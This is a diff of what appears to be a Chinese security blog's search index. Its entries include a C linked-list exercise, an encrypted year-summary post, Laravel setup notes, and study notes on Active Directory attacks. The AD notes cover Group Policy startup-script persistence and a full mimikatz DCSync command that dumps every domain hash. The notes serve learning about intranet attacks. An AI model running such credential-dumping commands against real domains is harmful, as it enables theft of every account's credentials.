t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>多谢刘**的指导（内心抗拒）</p>
-<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>算法与数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2020总结</title>
-    <url>/2021/02/06/2020%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="fb019f63dea109d9fadf7d96232539285e089d151e19e57b624edd6fae8266cd">792211fae0f67a76b537e59fee9c2dab1daa41aa57e19023a9c46972eb7bec605162ac581642f42cb4fadcc908a6dcde966bb263ff9e23df3f37df013b613928a7c1f47986677b593afe1b1a12d171a6d217ba32affbb538d4b2e67a151ad2bcccf594e20f357d8af32445734a5de93275111a1849d1c6380ef7d3613509899e824e57f6402d9157d86339bf1c35fdd7d02152385c75a2b2dec5eca877221e9c03761fa9ae1d2076e657c2a49c69fc366e3f62f82c6cc095fd85ae3bfff90b077afe6f509ddf69b197d6acae3800fa4a4e73fa9bac4ad7c1c3eeaaa8f77bda019bee75d5b69a1f069d6442ecf0dedf64db33e7236cf4d2cd6d397131af4d0cb0673cddbe4f595ad75cac0067b6fa4ea1360eca1aa14259fc35ead18a4793027578d34278cd4c27f452c9d544b19170655ae6347a2c07ec141a433b26efe327de9a6541243bf97697b8b72d69515da1adaa0c1a3fa65af922f057ef8c43222994aff1ec12c0c2925ed4e8052a97afdb1cd6c4a9b25b4d66bbbbc3522fe5ea883c0c88f02f92c5c4edd415dad8d1e80c1f18bb6e6636c48ef32799a8a86ae0a801805260d69876e7d3ffce4c5c46c24bb346ffbda7479f592024dfe1293f9c4082f2f2248a35fcebca655cd02b139254638ecc82e7db8d141a81ab470a9a2582ab1364be25f20f7c0414da5dda8cdced80add8fa4552c0cfcd38407c4af3dfecb2a6d9df32ab0cc3d3108450fb83d65389ec6460de72488b9de1e20192e34b9c2a19e367b361fab61ef52fc2f5d6f76f9906f656c6bd361108032a769a8cc8b5d37b5cdcd12d3bd0cfaa4c41d3b9cbb7ae54a6ad721f8d3640753eb5e417e623b671952005d5b13d8f4d2a8c96769270b18d45d7b050eff938243e1846a747137604277364f8f772c95a96e64493780477e33c4cb841c30e5252af1bf651618beef24ac574c7e9ada427e1c9ee9ad08fa57f940781aeae416fcf4aa2406714ccb6ec4b8c35cb36445859e1b77c1fdeb835a0290cc648197a34e777056ca03491095c5d2c0d114b65b126634bdda88fbaa2255992e959c0e23343fd64ee273d21802d89340d476b63b94a0a5074545fd345e71200f68014c949b8a78685c0c4dc4b9a9996d000c4c84c918b0f11beb34f6ad5dfebdd82d7bbac04dece7f4166ea8a3e2ec769c1807d8ac6f326826a79e81da695d9d644749a6f645860d6d0c0bf588723e2b8261d6143670775e814a2e6bdbe8b434d74fcb6758e7df3e6c1c7be41f9041c47ac47be258fafa6ac1cfc0b6b533da4bb12a3c6ad1384c0fb439428c19c6a1d823343b9b87bf3817da8b0c5b3c3f11bb60d79c0cb82738b89717147aebf8061593c7ca8fa1eea1e4382afb14cc54b5b7790ee38acb26b84998600b154f7ce16623494d6240eda8b79410eef31aa89dbe2a050637cbb624c81ac4f49e17f0fdcc49ba3b435a45e3f37b502ccde5a0141bbd1f1bd58ba25c94815eb37eb4c84dd3ff96ad1ca21a1fcd14f85c2c6a1fd021bfaf7d7806951e78a5ede641a9f758a8c65026b4f6f5847b55bf77bbc9a07ae2adc7d8c2bf2cdaa2db95a5433dd9cf2741bf2af8f2ccc193974f07b08a26654f3f4ae83bbd05f549183f9e861d56cb2388b353a35338ef5ff27acd444b18707a63047f94990cafe9d1c074f3e39fd4a801c3fbf22af821202af2d8d8e9d1832ee0bca257e38b574a5dd786220b4d05b47def8827c013a9d2d9feadac184cd5ff061e282e9bad3ec2f9fee25d23754a23aa0bc95ae6fd885777eeb8afb6df415e4235d6cf10dde4ccb2094cbfa4dd38087a36bbd5ca0c03387b4f08aea0ccdf9b0e6525f53c70de5a8d07989fdd083ef500a20564254c835fc32b80119cd1cdeb1ba17c87e719f219adf439286591f83ba7d06b5496900f10d17e94a57c3f46b7dd617e81a71eb5f41e5b5125772158d5fd1f4c4a90237aa343c203e19f32100e01994400f899abf54b3f020a5fc6f436ee503965b708cf3931dd1a76525f22a2775304d317ef022b457f9305997f8c78bc3cadf2024f067492113669798c60dbbde9ef5de588401fcef52bd4cf33e95bcc2c642bf45416f26b0c04ab90625472047e78672fee3c8a7bff2ca9897aabea89651fdb3e07a26ac89372885e1c87e2b1d4a30b198a7c2bd587cc3ee063b499cdeaa2efa47412213dd288bd776262363d8802db2108d8397df176d590dc449ea433a6d2790d854aedf0ca9e41d17c5f4a786bc9c93ddb96bbb1a2de0ad944ccf70b099bf02abadbf84e071f5418ccf2f7f25907e839eb3dbd5eb6cdb334f9e25f43bf4bc5974dd2974d3da11bd9b9c4917e579bf74380d19384bcca7b56abebd1c6808eb9c879920c462713bf73d9920944678da1c68332e009101c21cf4addf52e0cc873d88f86e4c6715b0c42d2d61c82500a6db101ab83f3640dab660bc8ef770fbca19b02758607e402d9f96c16910beb0a700279d4c385740caa3ebb39ec7cc248d2e6189c92575dc85ac658a81b45c4116500379fc91faf7bc08940d8b729864af184cfb08c0c6999b24d8a58290b4ce431acdb2a35b91153ab52408759c2b1b0726ebbedf2b293d90187bcecf4d9a3c477a7ab92fa622109ae064ad834b2a03b40c941e2bbdf859b79077c7aa654ecdc01e8153cd12fc617c04fb70a0eb2066ae937e2b57f4dc04e0ab298d37c88761fbc7350e14fe10f2aada11410211a7087955178465090f641683ea17884377427547665268357b390290d5524c0408cc24f5921c16cd6f6137f14304ea9380b66488dd2f806a3d2c54bffb6a29c9a3ca2360313219da1ffbdaee5de55e30678526e1383855cc6fc192e2a61f3b14bbfee4176cf90ada541676d5ab537b998eec2449feb0005a4c1a310746a76cae02eb28c41417c71d773010a929338efd6696816053062f6b999b4c50ead027ebbf7ef1e6a71b8abc855271f2c8e9077907c5e39a5068f4b697e073b0c1d0c727c6b616aac8034b1078ab78b4d032f22e59d4267c025ad5e7215e11a5f9909aed466b8b58d026f9a24be85668931f99537779044274828e0db16e229aa9f16a21bed219903e0b404b6368da9a5462bf8ba98dd4298fb8989bab9a51c0cc012964eaba6ad080c3b4c1b2f666261555cd073f7c88df3553c26a64cf273486923b6d5736b9744797c3ebe9c282875f6c3deb569684a9866439c1ba1f9b5c4e28fa81108246cadbc4fa25c90623e7c611caa166ccf06a6e8aeb8989a7a38961fcfe008413c785569010cd0976ce52710e22ba1423d8ca254d65321086b86f6415eaa0a98c3bc1a0f8e596223ff62a193541bc48cf5259cc15267f6bf704e00e0c06f81efa4ad1ad2a3e6e3a86f183fc798e0d69b20a9b51572cdce30d6fc546183e823a78f265ccf67b7dab53640fe28fef165f0c5f00bb9a55aee92d43941da5b4276cae27c210f54c7c04d86c989e3ad034774e4f92628384e99f7e5f6237bc6416f4cfc63e58668cc14f9440cd3db8a2dfcbd5a572cfc4f32d724640f3beaeb8043f28a5bae0b3c184995e032955eb3b70d1a7a54530467ae0e424be7fb724432ffaa2fe74095132bcb591952d1c5dfed4c6364facd3260da73f6f1f4195bb01d757553bdab14a3a2b1fdf369427e2288e3cac9e853d8856504cbd7092801fbfca57686bcc9f57717f871b07f6183a25b1ba9c97d807dc5c9ce3ec31832c8090424f4e78a3d67e69d89e70886d52d9480e0b3a83b8ad53d572ffd1a8099ac5834851da7b10c0bc7a0a4e7c29104b4cd352c85a76047aee59dc4189b9f2059472c84c4b14dc49074bbe0151a351c7d768ef4511fa9136335a1172429391aba5cae8b1135a26a95a608d59792fff5f09ed578daa9a5e8fba0bf12ceedc7bde0c81d37488ed3af0f2801dd507e52970d688ba0e40703ed64faa243f71b10f20b81df2ffbcfd7a06318d1ee87f77e2d1ec1dcff3661d51b06a581e02d429e5ee2ee43ac1effa2d485293759c4b0e2478188198110c0679454936696f9b842327d90c63787fc73d405a9e22b0e26767f5eb4c40208d0f259d1b43ad790a66484c37c26c71b2335ae6a35d6ed8afa90000a7277461729c4f8d39a4d81d400b79e491ac4f01bc94fcd966508dc53e6131500c905afa0d76e6369c2f63c9361db8610957a703554228ce13262ed6573010235d3a2501dec31741bf0f3be50ed49525362c7ff51457cc976958b604beaa777859f67a1796a71afa8f00aaf00c07e88f2e2f184128e29aec344119618b1f79f4574424a5b767ef7d9438858d03e443ae5955e8dbb3328eedd7842b52a48c570ddb5e4ac910454f8abe8165984cc96224e68d817f67ecbb896fb29dbff9fc5e06d7b5aa0a881e05ab2f315413a7a085e65cab0c322f3e71743eb2416c21667791bd6c495e2691218a6c86a7a9f6cc167774c960c7e971ee47fc09fbed9761115ff8eaaa42d0e206a5c9c3f78c11f1198502898724144a3b586d8383d3d5e9b6367f20a5768fd55fb6bd3cf02e203e2de2c0e3d4bd98a250c363017716f79f5662b8c004d33c4a7c61da6303291bfb9978c702653212a80ee4bf7528c981595a5092c17d8e449235dde47136f341889b6a53ffadd510bb24f027c9e731f29395b3a8b2b501a58354aa86e52da009e6f089b66ebf32fbc1269d65e101396195c4636b84176900251b125ee9927f9270</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是我的qq</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>经历</category>
-      </categories>
-      <tags>
-        <tag>对2020年总结</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2021总结</title>
     <url>/2022/01/11/2021%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><ul>
@@ -232,6 +232,65 @@
       </categories>
       <tags>
         <tag>对2021年总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AD域的攻击方式</title>
+    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
+<p>win+R键打开运行，输入“gpedit.msc”</p>
+<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
+<p>添加对应脚本即可</p>
+<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
+<p>通常用来权限维持</p>
+<span id="more"></span>
+
+<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
+<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
+<p>目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
+<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
+<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
+<p>Gpp 用来在下面场景存储和使用凭据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="relay"><a href="#relay" class="headerlink" title="relay"></a>relay</h1><p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
+<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><ul>
+<li>需要获得以下任一用户的权限：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>AD域的攻击方式</tag>
       </tags>
   </entry>
   <entry>
@@ -320,65 +379,6 @@
       </categories>
       <tags>
         <tag>DASCTF July X CBCTF 4th</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AD域的攻击方式</title>
-    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h1 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h1><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
-<p>win+R键打开运行，输入“gpedit.msc”</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
-<p>添加对应脚本即可</p>
-<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
-<p>通常用来权限维持</p>
-<span id="more"></span>
-
-<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
-<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
-<p>目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
-<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
-<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
-<p>Gpp 用来在下面场景存储和使用凭据</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-<h1 id="relay"><a href="#relay" class="headerlink" title="relay"></a>relay</h1><p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
-<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
-<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><ul>
-<li>需要获得以下任一用户的权限：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>AD域的攻击方式</tag>
       </tags>
   </entry>
   <entry>
@@ -527,6 +527,144 @@
       </categories>
       <tags>
         <tag>Go学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Laravel</title>
+    <url>/2022/04/04/Laravel/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Laravel 是一个 Web应用框架，php作为底层语言，能够有很好的扩展，拥有比较完善的软件包。</p>
+<p>中文官方：<a href="http://laravel.p2hp.com/cndocs/9.x/installation">http://laravel.p2hp.com/cndocs/9.x/installation</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ol>
+<li>composer下载 ：<a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></li>
+</ol>
+<p>安装目录下执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo @php &quot;%~dp0composer.phar&quot; %*&gt;composer.bat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">composer -V</span><br><span class="line"></span><br><span class="line">换源</span><br><span class="line">国内：</span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.phpcomposer.com</span></span><br><span class="line">或</span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.laravel-china.org  （这个可能有时会报错）</span></span><br><span class="line"></span><br><span class="line">国外官方：</span><br><span class="line">composer config -g repo.packagist composer https://packagist.org </span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>从<a href="https://laravelacademy.org/post/2%E4%B8%8B%E8%BD%BD%E6%A1%86%E6%9E%B6">https://laravelacademy.org/post/2下载框架</a></li>
+</ol>
+<p>或者</p>
+<p>利用composer直接下载，在phpstudy 的www目录下执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist  laravel&#x2F;laravel laravel8  #创建laravel8文件，将框架下载到其中，不指定版本</span><br><span class="line"></span><br><span class="line">composer create-project --prefer-dist  laravel&#x2F;laravel laravel 7.x #指定版本</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404135443531.png" alt="image-20220404135443531"></p>
+<p>phpstudy 配置：设置根目录到为public<br><img src="/2022/04/04/Laravel/image-20220404135516295.png" alt="image-20220404135516295"></p>
+<p>访问如下图</p>
+<p><img src="/2022/04/04/Laravel/image-20220404135640257.png" alt="image-20220404135640257"></p>
+<p>以下代码分析均为<code>laravel8.83.6 </code>框架，目前laravel框架已经更新到9.x了</p>
+<h1 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h1><p>主要目录分析</p>
+<p><img src="/2022/04/04/Laravel/image-20220404150632990.png" alt="image-20220404150632990"></p>
+<h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">整个laravel最主要部分，主要代码都在app目录下完成，包含了mvc三大模块</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404151946298.png" alt="image-20220404151946298"></p>
+<ul>
+<li>/app/Http</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包含控制器，中间件，表单请求等，</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404153320786.png" alt="image-20220404153320786"></p>
+<ul>
+<li>/app/Models</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包含Eloquent 等模型文件，用于处理数据库操作实现。每个表都有对应的model类，通过模型方法进行数据表的增删改查。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="bootstrap"><a href="#bootstrap" class="headerlink" title="bootstrap"></a>bootstrap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">存放所有的第三方代码，包括框架函数源码（&#x2F;vendor&#x2F;laravel）、插件和扩展等。</span><br></pre></td></tr></table></figure>
+
+<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站入口，存放对外开放的资源目录，</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404154958546.png" alt="image-20220404154958546"></p>
+<h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库操作相关文件（数据库迁移和数据填充）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404155250445.png" alt="image-20220404155250445"></p>
+<h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前端控制器和资源相关文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404155516021.png" alt="image-20220404155516021"></p>
+<h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">资源文件,前端显示内容，通常利用路由调用views里面的文件进行显示</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404155645046.png" alt="image-20220404155645046"></p>
+<h3 id="routes"><a href="#routes" class="headerlink" title="routes"></a>routes</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过配置路由，进行资源的访问，请求，页面的显示等</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220405005017795.png" alt="image-20220405005017795"></p>
+<h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编译后的视图、基于会话、文件缓存和其它框架生成的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/04/Laravel/image-20220404155731350.png" alt="image-20220404155731350"></p>
+<p>​    </p>
+<h3 id="texts"><a href="#texts" class="headerlink" title="texts"></a>texts</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">应用测试相关文件</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">需要调用的 依赖模块</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>.env</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DB_CONNECTION&#x3D;mysql</span><br><span class="line">DB_HOST&#x3D;127.0.0.1</span><br><span class="line">DB_PORT&#x3D;3306</span><br><span class="line">DB_DATABASE&#x3D;laravel    数据库名</span><br><span class="line">DB_USERNAME&#x3D;root       数据库账户</span><br><span class="line">DB_PASSWORD&#x3D;XXXX       数据库密码</span><br></pre></td></tr></table></figure>
+
+<p>/config—&gt;database.php</p>
